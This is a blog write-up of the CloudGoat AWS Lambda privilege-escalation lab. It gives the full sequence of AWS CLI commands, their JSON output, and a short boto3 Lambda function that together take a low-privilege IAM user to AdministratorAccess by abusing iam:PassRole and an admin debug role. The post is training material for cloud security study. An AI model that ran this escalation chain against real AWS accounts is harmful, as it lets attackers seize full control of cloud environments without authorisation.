---
title:  "CloudGoat: Lambda Privilege Escalation"
date:   2024-03-16
tags: cloudsecurity cybersecurity aws
last_modified_at: 2024-03-16
---

This scenario, we will start with `chris` user who has a permission to assume roles and we have 2 two roles that we can use to grant admin access to chris.

In this blog, I will use AWS cli profile `chris` for `chris` user.
{: .notice--info}

### Explore `chris` permissions
```shell
aws --profile chris iam list-attached-user-policies --user-name <chris-username>
```

Result:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-chris-policy-lambda_privesc_###",
            "PolicyArn": "arn:aws:iam::###:policy/cg-chris-policy-lambda_privesc_###"
        }
    ]
}
```

And see what version it is
```shell
aws --profile chris iam get-policy --policy-arn arn:aws:iam::###:policy/cg-chris-policy-lambda_privesc_###
```

Result:
```json
{
    "Policy": {
        "PolicyName": "cg-chris-policy-lambda_privesc_###",
        "Arn": "arn:aws:iam::###:policy/cg-chris-policy-lambda_privesc_###",
        "DefaultVersionId": "v1"
    }
}
```

See the policy document
```shell
aws --profile chris iam get-policy-version --policy-arn arn:aws:iam::###:policy/cg-lambdaManager-policy-lambda_privesc_### --version-id v1
```

Result:
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "sts:AssumeRole",
                        "iam:List*",
                        "iam:Get*"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "chris"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1"
    }
}
```

From the result, The `chris` user can assume a role, so we will explore more to see what role that we got.

### List roles
```shell
aws --profile chris iam list-roles
```

Result:
```json
{
    "Roles": [
        {
            "RoleName": "cg-debug-role-lambda_privesc_###",
            "Arn": "arn:aws:iam::###:role/cg-debug-role-lambda_privesc_###",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Sid": "",
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "RoleName": "cg-lambdaManager-role-lambda_privesc_###",
            "RoleId": "AROAUHVVLMMSZX5YP5JV5",
            "Arn": "arn:aws:iam::###:role/cg-lambdaManager-role-lambda_privesc_###",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Sid": "",
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::###:user/chris-lambda_privesc_###"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        }
    ]
}
```

We got 2 interesting roles, one for a user and another one for lambda

`cg-lambdaManager-role-lambda_privesc_###` role allows `chris` user to assume the role itself. And `cg-debug-role-lambda_privmesc_###` role allows lambda to assume the role itself.

Let's what each roles can do. First, list all attached role policies for lambda manager role
```shell
aws --profile chris iam list-attached-role-policies --role-name cg-lambdaManager-role-lambda_privesc_###
```

Result:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-lambdaManager-policy-lambda_privesc_###",
            "PolicyArn": "arn:aws:iam::###:policy/cg-lambdaManager-policy-lambda_privesc_###"
        }
    ]
}
```

Let's see the policy document.
```shell
aws --profile chris iam get-policy-version --policy-arn arn:aws:iam::###:policy/cg-lambdaManager-policy-lambda_privesc_### --version-id v1
```

Result:
```json
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "lambda:*",
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "lambdaManager"
                }
            ]
        }
    }
}
```

Lambda Manager role can do anything with lambda and also has ability to pass a role to any AWS services.

Let's see what another role can do
```shell
aws --profile chris iam list-attached-role-policies --role-name cg-debug-role-lambda_privesc_###
```

Result:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

The lambda debug role have admin access policy, which is quite powerful policy.

__Stop to think:__
We gonna gain privileged with admin access, by assuming the manager role to create lambda function, passing the `cg-debug-role-lambda_privesc_###` role to this function and using this function to attach the admin access policy to `chris` user.
{: .notice--info}

### Assume the manager role
```shell
aws --profile chris sts assume-role  --role-arn arn:aws:iam::###:role/cg-lambdaManager-role-lambda_privesc_### --role-session-name <whatever-you-want>
```

Result:
```json
{
    "Credentials": {
        "AccessKeyId": "<access-key-id>",
        "SecretAccessKey": "<secret-access-key>",
        "SessionToken": "<session-token>",
    },
    "AssumedRoleUser": {
        "Arn": "arn:aws:sts::###:assumed-role/cg-lambdaManager-role-lambda_privesc_###/<session-name>"
    }
}
```

We got `AccessKeyId`, `ScretAccessKey` and `SessionToken`. Now, we can create the lambda manager profile from this credentials.

If you don't know how <a href="{% post_url 2024-03-05-cloudgoat-vulnerable-lambda %}">see here</a>

I will use `chris-lambda-manager` as the lambda manager user.
{: .notice--info}

### Create lambda function
Create python file name `lambda_function.py` and archive file as zip file.
```python
import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName = '<chris-user-name>', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
	return response
```

Create lambda function
```shell
aws --profile chris-lambda-manager lambda create-function --function-name admin_function --runtime python3.9 --role arn:aws:iam::###:role/cg-debug-role-lambda_privesc_### --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip
```

### Invoke lambda function
Invoke lambda function
```shell
aws --profile chris-lambda-manager lambda invoke --function-name admin_function out.txt
```

### Check `chris` user policy
```shell
aws --profile chris iam list-attached-user-policies --user-name <chris-username>
```

Result:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-chris-policy-###",
            "PolicyArn": "arn:aws:iam::###:policy/cg-chris-policy-###"
        },
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

Now the `chris` user got admin access policy. 😈